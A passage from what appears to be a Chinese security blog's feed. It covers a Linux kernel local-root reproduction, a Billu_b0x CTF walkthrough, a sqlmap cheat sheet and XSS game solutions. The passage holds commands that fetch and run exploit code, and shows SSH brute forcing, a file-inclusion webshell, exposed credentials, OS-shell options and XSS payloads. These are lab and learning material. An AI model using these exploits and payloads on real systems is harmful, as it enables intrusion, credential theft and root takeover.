攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。 目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。 影响版本： Linux内核：Linux Kernel Version 4.4 ~ 4.14 Ubuntu版本：16.04.01~ 16.04.04 漏洞等级高危 漏洞危害提升到root权限 漏洞检测方法1.编译POC,运行判断是否存在 2.漏洞扫描器扫描 漏洞利用方法123456789101112131415$ whoami //查看当前用户hack$ wget http://cyseclabs.com/pub/upstream44.c //下载EXP$ lsupstream44.c$ gcc -o exp upstream44.c //编译并输出到exp应用程序中$ chmod 777 exp //赋予权限$ ./exp //执行task_struct = ffff880015e9f000uidptr = ffff88001d42b5c4spawning root shellroot@mozhe:~# lsexp upstream44.croot@mozhe:~# id //以获取权限uid=0(root) gid=0(root) groups=0(root),1001(hack) 漏洞修复方案1.及时升级系统 2.去官网打补丁]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF综合靶机（Billu_b0x）渗透测试]]></title>
    <url>%2F2019%2F03%2F03%2FCTF%E9%9D%B6%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。 下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112131415161718192021222324252627root@kali:~# nmap -sP 192.168.149.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 16:49 CSTNmap scan report for 192.168.149.1Host is up (0.00036s latency).MAC Address: 00:50:56:C0:00:01 (VMware) Nmap scan report for 192.168.149.132 //靶机地址Host is up (0.00019s latency).MAC Address: 00:0C:29:E8:DA:C7 (VMware)Nmap scan report for 192.168.149.254 //网关地址Host is up (0.00091s latency).MAC Address: 00:50:56:F5:FB:82 (VMware)Nmap scan report for 192.168.149.131 //kali主机地址Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds 使用nmap的-sV扫描目标系统开放的服务，-p-表示对目标系统全部端口进行扫描，–script=banner表示使用nmap中的脚本去扫描目标系统的服务版本信息 123456789101112131415root@kali:~# nmap -sV -p- --script=banner 192.168.149.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 17:20 CSTNmap scan report for 192.168.149.132Host is up (0.0012s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.480/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)MAC Address: 00:0C:29:E8:DA:C7 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds 发现目标系统只开放了22端口和80端口，那么先从80端口尝试一番 探测SQL注入漏洞：通过浏览器访问目标系统的80端口，出现下面的页面，需要展示SQL注入技巧，尝试了几个SQL万能密码都没办法成功，那么可以用sqlmap跑一跑，可能能跑出结果 因为使用burpsuite抓包的值是post类型的数据包，所以我们设置的sqlmap命令为： 1sqlmap.py -u &quot;http://192.168.149.132/&quot; --data=&quot;un=admin&amp;ps=123456&amp;login=let%27s+login&quot; --dbms=&quot;mysql&quot; --level=3 --batch 但是跑了好久也没有跑出来，只能换一种方法 目录爆破：试试目录爆破获取可以获取到有用的信息 我平时在Windows下使用的是御剑，kali 中用得是dirb和dirbuster 123456789101112131415161718192021222324252627282930313233343536root@kali:~# dirb http://192.168.149.132-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sun Mar 3 18:03:34 2019URL_BASE: http://192.168.149.132/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.149.132/ ----+ http://192.168.149.132/add (CODE:200|SIZE:307) + http://192.168.149.132/c (CODE:200|SIZE:1) + http://192.168.149.132/cgi-bin/ (CODE:403|SIZE:291) + http://192.168.149.132/head (CODE:200|SIZE:2793) ==&gt; DIRECTORY: http://192.168.149.132/images/ + http://192.168.149.132/in (CODE:200|SIZE:47559) + http://192.168.149.132/index (CODE:200|SIZE:3267) + http://192.168.149.132/index.php (CODE:200|SIZE:3267) + http://192.168.149.132/panel (CODE:302|SIZE:2469) + http://192.168.149.132/server-status (CODE:403|SIZE:296) + http://192.168.149.132/show (CODE:200|SIZE:1) + http://192.168.149.132/test (CODE:200|SIZE:72) ---- Entering directory: http://192.168.149.132/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &apos;-w&apos; if you want to scan it anyway) -----------------END_TIME: Sun Mar 3 18:03:38 2019DOWNLOADED: 4612 - FOUND: 11 当访问到test文件时，系统提示： 1&apos;file&apos; parameter is empty. Please provide file path in &apos;file&apos; parameter 文件包含：那么可以得出test文件内有一个文件包含函数，那么这里很有可能有个文件包含漏洞 原先构造URL为： 1http://192.168.149.132/test?file=/etc/passwd 发现没有反应，那么可能需要构造post类型数据包 由passwd我们可以得出当时可以登录的账号为root和ica用户 我们可以使用hydra进行爆破试试 1hydra -l root -P /root/dict/1433-pass.txt -T 6 192.168.149.132 ssh 当然hydra是可以爆破成功的，只要字典强大，爆出root密码为roottoor。这个等会用。 我们将刚刚爆破出来的文件一一下载看看里面有没有其他有用的内容 当在查看c.php文件时，发现其存在mysql数据库的账号和密码和数据库名。我们即可以通过数据库连接软件去连接 1234567891011121314151617&lt;?php#header( &apos;Z-Powered-By:its chutiyapa xD&apos; );header(&apos;X-Frame-Options: SAMEORIGIN&apos;);header( &apos;Server:testing only&apos; );header( &apos;X-Powered-By:testing only&apos; );ini_set( &apos;session.cookie_httponly&apos;, 1 );$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);// Check connectionif (mysqli_connect_errno()) &#123; echo &quot;connection failed -&gt; &quot; . mysqli_connect_error(); &#125;?&gt; 获得网站账号biLLu，密码hEx_it，然后成功登陆 在网站发现可以添加用户，并能上传图片，发现只能上传图片文件的后缀才可以，显然网站设置了白名单。 获取shell：我们之前查看test文件包含的时候，下载了panel.php文件，这个文件也存在文件包含的功能 1234567891011121314151617181920212223if(isset($_POST[&apos;continue&apos;]))&#123; $dir=getcwd(); $choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]); if($choice===&apos;add&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; if($choice===&apos;show&apos;) &#123; include($dir.&apos;/&apos;.$choice.&apos;.php&apos;); die(); &#125; else &#123; include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]); &#125; &#125; 那我们上传一个图片马上去，然后使用panel.php包含这个文件，成功获取到 刚刚在网上找这类靶机的文章，发现一位大佬爆破出phpmy目录，然后通过猜解路径去下载，这个文件默认路径在/var/www/phpmy下面，那么我们还可以通过文件包含下载这个文件，然后获取到root账号和密码 12345678910111213141516171819202122232425262728293031323334&lt;?php/* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&apos;Servers&apos;][$i][&apos;verbose&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = &apos;localhost&apos;;$cfg[&apos;Servers&apos;][$i][&apos;port&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;socket&apos;] = &apos;&apos;;$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;$cfg[&apos;Servers&apos;][$i][&apos;extension&apos;] = &apos;mysqli&apos;;$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = &apos;roottoor&apos;; //root密码$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = true;/* End of servers configuration */$cfg[&apos;DefaultLang&apos;] = &apos;en-utf-8&apos;;$cfg[&apos;ServerDefault&apos;] = 1;$cfg[&apos;UploadDir&apos;] = &apos;&apos;;$cfg[&apos;SaveDir&apos;] = &apos;&apos;;/* rajk - for blobstreaming */$cfg[&apos;Servers&apos;][$i][&apos;bs_garbage_threshold&apos;] = 50;$cfg[&apos;Servers&apos;][$i][&apos;bs_repository_threshold&apos;] = &apos;32M&apos;;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_blob_timeout&apos;] = 600;$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_log_threshold&apos;] = &apos;32M&apos;;?&gt; Ubuntu本地提权：那么使用xshell去远程连接目标服务器， 12345root@indishell:~# uname -aLinux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linuxroot@indishell:~# cat /etc/issueUbuntu 12.04.5 LTS \n \l 看到是Ubuntu12.04版本的，那么可以利用Ubuntu著名的本地提权exp 下载地址：https://www.exploit-db.com/exploits/37292 将EXP代码保存带文件内，然后赋予权限，进行编译 1234567891011121314151617181920root@indishell:~# vim exp.croot@indishell:~# chmod 777 exp.c //赋予权限root@indishell:~# gcc exp.c -o exp //编译root@indishell:~# ls exp exp.croot@indishell:~# mv exp /home/ica/ root@indishell:~# su - ica //由于是复现，我们切换用户为ica进行本地越权ica@indishell:~$ica@indishell:~$ lsexpica@indishell:~$ ./exp //执行EXPspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica) //成功越权#]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP速查表]]></title>
    <url>%2F2019%2F03%2F03%2FSQLMAP%2F</url>
    <content type="text"><![CDATA[时光匆匆流逝过，平平淡淡才是真。忍耐任由风雨过，守得云开见月明。 注：由于自己sqlmap命令不是很熟，经常只会使用常见的那几个参数，所以特地写了博客，将所有的命令一个一个的操作了一遍，然后码字，过程是辛苦的，但收货满满，很开心，晚安，世界！ 简介：SQLMAP是开源的渗透测试工具，主要用于自动化监测和利用SQL注入漏洞，它具有功能强大的检测引擎，能针对各种不同类型的数据库去获取数据库服务器的权限，获取数据库所存储的数据，访问并且可以导出操作系统的文件，甚至通过外带数据连接的方式执行操作系统命令。 所支持的DBMS：SQLMAP支持市面上常见的DBMS，包括MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird)和SAP MaxDB。 五种注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句直接返回在页面中。 联合查询注入，在使用union联合查询的情况下注入 堆查询注入，可以在同时执行多条语句的情况下注入 七种测试等级：使用参数-v指定对应的测试等级，默认是等级1.如果想看到sqlmap发送的测试payload最好的等级是3,。 1234567·0：只显示Python的回溯、错误和关键消息；·1：同时显示基本信息和警告信息；·2：同时显示调试信息；·3：同时显示注入的payload；·4：同时显示HTTP请求；·5：同时显示HTTP响应头；·6：同时显示HTTP响应页面页面。 基本功能：1.在sqlmap 0.8版本之后，提供了数据库直连的功能，使用参数-d作为SQL数据库的客户端程序来连接数据库的端口，需要安装一些python中的依赖库便可以进行访问，其语法格式为： 1sqlmap.py -d &quot;DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME&quot; 2.与BurpSuite，Google结合使用，支持正则表达式限定测试目标 3.可以对HTTP头部信息（GET,POST,Cookie,Referer,User-Agent等）进行自动注入或者手动注入。 ​ 另外Referer和User-Agent可以具体指定某一个值去进行SQL注入挖掘 ​ 如果cookie过期之后，sqlmap会自动处理set-cookie头，更新cookie的信息 4.进行限速处理：设置最大并发和延迟发送。 5.支持基本身份认证（Basic Authentication），摘要认证（Digest Authentication），NTLM认证，CA身份认证 6.能够进行数据库版本的发现，用户的发现，进行提权，hash枚举和字典破解，暴力破解表列名称 7.能够利用SQL注入进行文件上传下载，支持用户定义函数（UDF）利用存储过程执行存储过程，执行操作系统命令，访问Windows注册表 8.与w3af,metasploit集成结合使用，能够基于数据库进程进行提权和上传执行后门。 下载地址：http://sqlmap.org/ 操作选项:基本操作：1234567-h:显示帮助信息退出--hh:显示更多的信息并退出--version：显示程序版本并退出-v:设置等级，默认为等级1 指定目标：1234567891011121314151617181920GET方法： -d: 表示sqlmap将自己作为客户端去连接数据库 -u或者--url: 指定目标系统的URL， -p：对指定的参数进行SQL注入检测 -f: 检测数据库，服务器等（fingerprint）信息， -b或者--banner：获取数据库版本信息和数据库类型 --batch:不与使用者进行信息交互，直接执行 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; -p id -f --batch -g：对Google的搜索结果进行SQL注入探测.例如：sqlmap.py -g &quot;inurl:\&quot;.php?id=1\.&quot; --force-ssl:强制使用SSL/HTTPS协议 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --force-sslPOST方法： -r: 将HTTP请求文件保存到文本文档中，使用参数-r读取文本文件的参数进行SQL注入.例：sqlmap.py -r request.txt -l: 将burpsuite log文件保存到文本文档中，使用参数-l读取文本文档的参数进行SQL注入。例：sqlmap.py -l log.txt -c:对配置文件进行SQL注入探测 枚举模块：123456789101112131415161718192021222324-a/--all:获取所有信息-b/--banner : 获取DBMS banner--dbs:枚举DBMS中所有的数据库–current-user:获取当前用户--privileges-U username(当前账号/CU) ：查看当前账号的权限--roles:列出数据库管理员角色，仅适用于当前数据库是Oracle–current-db : 获取当前数据库–users : 枚举DBMS用户–passwords : 枚举DBMS用户密码hash值–tables: 枚举DBMS数据库管理系统中的表--columns:枚举DBMS数据库管理系统中的列--schema:枚举DBMS数据库管理系统的模式--dump:转储DBMS数据库表项，后面加-C表示转储某列，-T转储某表，-D转储某数据库，--start,--stop,--first,--last指定开始结束，开头结尾。--dump-all：转储所有的DBMS数据库表项-D：指定枚举的DBMS中的数据库-T：指定要枚举的表-C：指定要枚举的列-D 数据库名 --tables:查找指定数据库中的表-D 数据库名 -T 表名 --columns：查找指定数据库的某个表中的列--exclude-sysdbs:忽略掉系统数据库--count:查找表中的记录数--schema:查找数据库的架构，包含所有的数据库，表和字段，以及各自的类型，一般与--exclude-sysdbs--batch：默认每次自动执行--sql-query/--sql/shell:运行自定义的SQL语句，例：--sql-query=&quot;select * from users;&quot;所得到的内容被保存到dump目录中 请求模块：123456789101112131415161718192021222324252627282930313233--data=DATA :指定post数据包中被传输的值 例：sqlmap.py -u &quot;http：//www.xxx.com&quot; --data=&quot;name=123&amp;pass=456&quot; -f--cookie=COOKIE:指定cookie值登录web程序，并且会尝试自动注入cookie值 需要在level 2或者大于level 2等级才会进行cookie注入。 如果cookie被服务器端更新，那么sqlmap也会自动更新cookie值。 例:sqlmap -u &quot;http://192.168.149.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie=&quot;security=low; PHPSESSID=d806c1f76f24a9687640ce497afc8f20&quot; --batch--param-del:告知sqlmap变量分隔符。web程序一般默认是&amp;符号作为分隔符，如果并非&amp;，则需要指定变量分隔符 例：sqlmap.py -u &quot;http://www.xxx.com&quot; --data=&quot;user=123;pass=456&quot; --param-del=&quot;;&quot; -f指定HTTP头部信息：-user-agent:指定UA头部信息。sqlmap默认使用UA为：sqlmap/1.0-dev-版本号 http://sqlmap.org--random-agent:使用sqlmap/txt/user-agents.txt字典中的UA头部进行随机替换--host=&quot;host header&quot; ：指定host头部信息，当level为5的时候才会检测host值--referer=&quot;REFERER&quot; ：指定Referer头部信息，当level大于等于三 ,才回去检测referer头部是否存在注入--method=GET/POST：指定使用get或者POST方式发送数据，默认以get方式发送延时： --delay=DELAY:每次HTTP（S）请求之间延迟时间，值为浮点数，单位为秒，默认无延迟--timeout=TIMEOUT ：设置超时时间，默认30秒--retries=RETRIES:设置重连次数，默认3次--randomize:设置随机改变的参数值--scope:利用正则表达式过滤日志内容--safe-url=SAFEURL ：指定需要去重复扫描的地址--safe-freq：指定每发送多少次的注入请求之后接着发正常请求 注：有些web应用程序会在攻击者多次访问错误的请求时屏蔽掉以后的所有请求，所以设置这两个参数防止以后无法进行注入 例：sqlmap.py -u &quot;https://www.xxx.com/?id=1&quot; --safe-url=“http://www.xxx.com” --safe-freq=3 --skip-urlencode:跳过URL编码的载荷 注：默认在get请求中是需要对传输数据进行编码，但是有些web服务器不遵守RPC标准编码，使用原始字符提交数据，所以使用这个参数使sqlmap不使用URL编码的参数进行测试--eval=EBALCODE：在请求之前执行提供的python代码。 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --evel=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot; 身份认证模块：123456789101112--auth-type=AUTH:指定HTTP认证类型（Basic, Digest, NTLM or PKI）--auth-cred=AUTH:指定HTTP认证证书（格式为：name:password） 例：sqlmap.py -u &quot;http://www.xxx.com/?id=1&quot; --auth-type=Basic --auth-cred &quot;user:pass&quot;--auth-file=AUTH:指定HTTP认证PEM格式的证书/私钥文件代理：--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 代理模块：12345--proxy=&quot;http://127.0.0.1:8081&quot; //将设置国外的代理服务器，传递给本地的8081端口，这个命令是将本地的8081端口反弹到国外的服务器上面去执行命令--proxy-cred=&quot;name:pass&quot; 例：sqlmap -u &quot;http://www.xxx.com/?id=1&quot; --proxy=&quot;http://127.0.0.1:8081&quot; --proxy-cred=&quot;user:pass&quot; -f--ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。 优化模块：12345-o 开启所有优化开关 --predict-output 预测常见的查询输出 --keep-alive 使用持久的HTTP（S）连接 --null-connection 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS：设置最大的HTTP（S）请求并发量（默认为1） 注入模块：123456789101112131415-p:指定扫描的参数，也可以指定HTTP头部字段 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; -p &quot;User-Agent,Referer，id&quot;--skip：跳过对某些参数进行测试。当使用--level的值很大但是有个别参数不想去测试的时候使用--skip去跳过 例：sqlmap.py -u &quot;http://www.xxx.com/？id=1&quot; --skip &quot;User-Agent,Referer，id&quot;-u:设置URL注入点。当有些网站将参数和值一起加入到URL链接中，sqlmap是默认不对其进行扫描的，所以我们需要去指定对某个参数值进行注入 例：sqlmap.py -u &quot;http://www.xxx.com/param1/value1*/param2/value2*&quot; --dbms:设置目标服务器所使用的DBMS 例：--dbms=&quot;mysql&quot;--os:指定目标的操作系统 例：--os=&quot;linux&quot;--invalid-bignum:给参数值给与最大值让其失效--invalid-logical：使用布尔判断使取值失效--no-cast:榨取数据时，sqlmap将所有的结果转换成字符串，并用空格替换null值（老版本mysql数据库需要开启此开关）--tamper=TAMPER：使用给定的脚本去混淆绕过应用层的过滤，比如waf/ids等。该文件存放在/sqlmap/tamper文件下例：sqlmap.py -u &quot;www.xxx.com/?id=1&quot; -p &quot;id&quot; --tamper=&quot;between.py,overlongutf8more.py,lowercase.py &quot; 检测模块：123456--level :共有5级，默认等级1，可以自己制定，推荐等级3--risk:共有4级，默认等级1，risk升高可造成数据被篡改等风险--string:指定页面返回某个字符串则为真--not-string:指定页面不返回某个字符串则为真--Regexp:当查询的值为真时，使用正则表达式去匹配--code：当查询的值为真时，执行HTTP code 技术类型：12345678sqlmap默认使用这些操作--technique=TECH 指定sqlmap使用的检测技术，默认情况下会测试所有的方式。 --time-sec=TIMESEC 设置延迟时间，基于时间的注入检测默认延迟时间是5秒 --union-cols=UCOLS 联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。 --union-char=UCHAR 默认情况下sqlmap针对UNION查询的注入会使用NULL字符； --union-from=UFROM 在UNION查询SQL注入的FROM部分中使用的表 --dns-domain=DNS.. 攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度 --second-order=S.. 使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。 指纹信息：12-f/--fingerprint:查询目标系统的数据库管理系统的指纹信息-b/--banner:返回数据库的版本信息 爆破模块：12345678用于： mysql版本&lt;5.0的时候，没有information_schema库 mysql版本&gt;=5.0，但无权读取information_schema库 微软的access数据库，默认无权读取MSysObjects库。 --common-tables:爆破表名 例：sqlmap.py -u &quot;http://www.baidu.com/?id=1&quot; --common-tables --common-columns:暴力破解列名 UDF注入模块：1234UDF：自定义函数，利用UDF函数达到执行操作系统命令--udf-inject:注入用户自定义函数--shared-lib=SHLIB:指定共享库的本地路径这两条命令一起使用 系统文件操作：123--file-read=RFILE:从后端DBMS文件系统中读取文件（读取系统文件） 例：--file-read=&quot;/etc/passwd&quot;--file-write=SHELL.PHP --file-dest=DFILE：把当前系统的文件写入到目标服务器的某个目录下去 OS系统访问：123--os-cmd:运行任意操作系统命令（适用于数据库为mysql，postgresql，或Sql Server，并且当前用户有权限使用特定的函数） 例：--os-cmd id :执行id命令，后期是与sqlmap进行交互，生成UDF函数在操作系统下执行命令--os-shell:获取一个shell（目标系统为管理员权限，并且得知绝对路径） Windows注册表模块：1234--reg-read:读取注册表的值--reg-add:写入注册表值--reg-del:删除注册表值--reg-key,--reg-value,--reg-data,--reg-type:注册表辅助选项 一般性参数：123456789101112-s:指定sqlite会话文件保存位置-t:记录流量文件保存位置--charset:强制字符编码 例：--charset=GBK--crawl:从开始位置爬站深度 例：--crawl=3--csv-del:dump下来的数据以CVS格式保存--dbms-creb:指定数据库账号--slush-session:清空session--fresh-queries：忽略session查询结果--hex：当dump下非ASCii字符内容时，将其编码成16进账形式，收到后解析还原--save:将命令保存成配置文件 批处理模块：123--check-waf:检测WAF/IPS/IDS--hpp:绕过WAF/IPS/ISD，尤其是对ASP/IIS和ASP.NET/IIS有效--identify-waf:彻底的WAF/IPS/IDS检测，支持三十多种产品 杂项模块：1234--mobile：模拟智能手机设备，修改User-Agent为手机端的UA--purge-output:清空output文件夹--smart：当有大量检测目标时，只修改基于错误的检测结果--wizard:设置用户向导参数，教你一步步针对目标注入]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS小游戏]]></title>
    <url>%2F2019%2F02%2F25%2Fxss%E5%B0%8F%E6%B8%B8%E6%88%8F%2F</url>
    <content type="text"><![CDATA[生命中遇到最美的景致，并不需要浓墨重彩去描绘，而是平常心踩出的一串淡淡的足迹。 今天在网上找到了一个XSS小游戏，觉得蛮好玩的，刚好自己对XSS理解不深，拿来学习正好！ 这个XSS程序直接放到phpstudy中，访问即可 那么就开始我们的探索旅程吧！ Level 1：根据URL和网页源代码可以看出test变量是可控的 1http://127.0.0.1/xss/level1.php?name=test 1234567&lt;script&gt;window.alert = function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt; 那么可以构造payload，将test替换成payload即可,为： 1&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt; 我原先以为需要闭合前面的双引号才可以执行payload进行弹窗，但是不闭合也是可以弹窗的： 1&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 2:先把第一关的payload拿来试试，看看被过滤了哪些参数 123456789101112&lt;title&gt;欢迎来到level2&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(xss)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&lt;script&gt;alert(xss)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:27&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 发现是把URL中的keyword参数的值进行了编码，这是使用了一个过滤函数htmlspecialchars()将预定义的字符转换成HTML实体，但是并未对input标签内的test值进行编码，那么我们可以对这个标签构造闭合，payload为： 1&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; Level 3:这次我们在搜索框输入xss，首先判断服务器将我们输入的内容放在代码的哪个位置，然后尝试闭合绕过 123456789101112&lt;title&gt;欢迎来到level3&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和xss相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;xss&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 可以看到有两处我们所搜索的xss字符串 而且发现URL也改变啦 1http://127.0.0.1/xss/level3.php?keyword=xss&amp;submit=%E6%90%9C%E7%B4%A2 试了好几个payload都没有成功，然后没办法，开始看代码 发现有一段PHP代码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 其中涉及到htmlspecialchars() 函数 在网上查了查这个函数，他是把预定义的字符转换为 HTML 实体。 1234567Character HTML Entity Notes&amp; &amp;amp; &quot; &amp;quot; Depending on how [quote_style] is set&apos; &amp;#039 Depending on how [quote_style] is set&gt; &amp;gt; &lt; &amp;lt; 但是htmlspecialchars（）函数默认的配置不过滤单引号的。只有设置了:quotestyle选项为ENT_QUOTES才会过滤掉单引号。 我们来试一试用事件来弹框： onmouseover 事件会在鼠标指针移动到指定的对象上时发生 1&apos;onmouseover=alert(1) x=&apos; onclick 事件会在对象被点击时发生。 1&apos;onclick=&apos;window.alert() 还有其他事件也是可以实现的，我这里就演示两个！ Level 4:之后都是查看网站源码，旨在学习xss！ 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0); //关闭输出程序错误信息$str = $_GET[&quot;keyword&quot;]; //通过GET方式获取keyword变量的值$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); //将获取到的变量值中的&gt;替换成空，并传递给变量str2$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2); //将获取到的str2的值中的&lt;替换成空，并传递给str3echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt; //设置输出框，将str3的值输出到框内&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 因为所获取到的str3的值只是过滤掉&lt;&gt;这两个符号，我们将Level 3的payload进行修改成为： 当鼠标移动到这个字符串的时候弹窗 1&quot;onmouseover=&quot;alert(1) 当鼠标点击输入框的时候弹窗 1&quot;onclick=&apos;window.alert() Level 5：123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); //将传入的参数值中的&lt;script&gt;替换成&lt;scr_ipt$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); //将str2中的on字符串替换成o_necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 这里我们将无法使用JavaScript事件来进行弹窗。在这里附上JavaScript事件的事件表，以供学习参考 属性 当以下情况发生时，出现此事件 FF N IE onabort 图像加载被中断 1 3 4 onblur 元素失去焦点 1 2 3 onchange 用户改变域的内容 1 2 3 onclick 鼠标点击某个对象 1 2 3 ondblclick 鼠标双击某个对象 1 4 4 onerror 当加载文档或图像时发生某个错误 1 3 4 onfocus 元素获得焦点 1 2 3 onkeydown 某个键盘的键被按下 1 4 3 onkeypress 某个键盘的键被按下或按住 1 4 3 onkeyup 